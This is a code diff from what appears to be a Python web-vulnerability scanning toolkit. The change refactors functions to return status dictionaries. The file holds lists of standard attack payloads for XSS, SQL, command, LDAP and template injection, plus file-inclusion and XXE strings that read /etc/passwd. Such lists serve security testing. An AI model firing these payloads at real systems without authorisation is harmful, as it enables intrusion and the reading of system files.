@@ -59,31 +59,34 @@ def scan_open_redirect(url: str, param: str, target: str = "http://example.com")
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-def generate_xss_payloads() -> List[str]:
-    return [
+def generate_xss_payloads() -> Dict[str, Any]:
+    payloads = [
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert(1)>",
         "<svg/onload=alert(1)>",
         "javascript:alert(1)",
         "'\"><script>alert(1)</script>"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def generate_sqli_payloads() -> List[str]:
-    return [
+def generate_sqli_payloads() -> Dict[str, Any]:
+    payloads = [
         "' OR 1=1 --",
         "' OR '1'='1",
         "admin' --",
         "' UNION SELECT 1,2,3 --",
         "sleep(5) --"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def generate_lfi_payloads() -> List[str]:
-    return [
+def generate_lfi_payloads() -> Dict[str, Any]:
+    payloads = [
         "../../../../etc/passwd",
         "....//....//....//etc/passwd",
         "../../../../windows/win.ini",
         "php://filter/convert.base64-encode/resource=index.php"
     ]
+    return {"status": "success", "payloads": payloads}
 
 def identify_input_params(url: str) -> Dict[str, Any]:
     """Extracts input names from forms."""
@@ -108,11 +111,19 @@ def check_http_verb_tampering(url: str) -> Dict[str, Any]:
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-def basic_html_encoding(text: str) -> str:
-    return html.escape(text)
+def basic_html_encoding(text: str) -> Dict[str, Any]:
+    try:
+        encoded = html.escape(text)
+        return {"status": "success", "encoded": encoded}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
-def basic_html_decoding(text: str) -> str:
-    return html.unescape(text)
+def basic_html_decoding(text: str) -> Dict[str, Any]:
+    try:
+        decoded = html.unescape(text)
+        return {"status": "success", "decoded": decoded}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 def check_xml_rpc(url: str) -> Dict[str, Any]:
     try:
@@ -124,20 +135,20 @@ def check_xml_rpc(url: str) -> Dict[str, Any]:
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-def check_local_file_inclusion_heuristic(url: str, param: str) -> str:
+def check_local_file_inclusion_heuristic(url: str, param: str) -> Dict[str, Any]:
     # Very basic check if page size changes drastically or reflects content
     # Safe check is hard.
-    return "Heuristic LFI check requires manual analysis usually."
+    return {"status": "info", "message": "Heuristic LFI check requires manual analysis usually."}
 
-def detect_base64(text: str) -> bool:
+def detect_base64(text: str) -> Dict[str, Any]:
     import base64
     try:
         if len(text) % 4 == 0 and re.match('^[A-Za-z0-9+/]+={0,2}$', text):
             base64.b64decode(text, validate=True)
-            return True
-        return False
+            return {"status": "detected", "is_base64": True}
+        return {"status": "not_detected", "is_base64": False}
     except:
-        return False
+        return {"status": "not_detected", "is_base64": False}
 
 def check_stack_trace_exposure(text: str) -> Dict[str, Any]:
     indicators = [
@@ -152,45 +163,49 @@ def check_stack_trace_exposure(text: str) -> Dict[str, Any]:
         return {"status": "vulnerable", "traces_found": found}
     return {"status": "safe", "message": "No stack trace indicators found"}
 
-def generate_cmd_injection_payloads() -> List[str]:
-    return [
+def generate_cmd_injection_payloads() -> Dict[str, Any]:
+    payloads = [
         "; cat /etc/passwd",
         "| whoami",
         "`whoami`",
         "jules",
         "&& dir"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def generate_ldap_payloads() -> List[str]:
-    return [
+def generate_ldap_payloads() -> Dict[str, Any]:
+    payloads = [
         "*",
         "*)(uid=*))(|(uid=*",
         "*()|&'",
         "admin*)((|userpassword=*)",
         ")(|(uid=*)"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def generate_xml_payloads() -> List[str]:
-    return [
+def generate_xml_payloads() -> Dict[str, Any]:
+    payloads = [
         "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def generate_ssti_payloads() -> List[str]:
-    return [
+def generate_ssti_payloads() -> Dict[str, Any]:
+    payloads = [
         "{{7*7}}",
         "${7*7}",
         "<%= 7*7 %>",
         "{{''.__class__.__mro__[1].__subclasses__()}}"
     ]
+    return {"status": "success", "payloads": payloads}
 
-def check_json_response(url: str) -> str:
+def check_json_response(url: str) -> Dict[str, Any]:
     try:
         res = requests.get(url, timeout=5)
         res.json()
-        return "Returns Valid JSON"
+        return {"status": "success", "message": "Returns Valid JSON"}
     except:
-        return "Not JSON"
+        return {"status": "failure", "message": "Not JSON"}
 
 def check_api_docs(url: str) -> Dict[str, Any]:
     paths = ['/swagger.json', '/api/docs', '/docs', '/redoc', '/openapi.json']
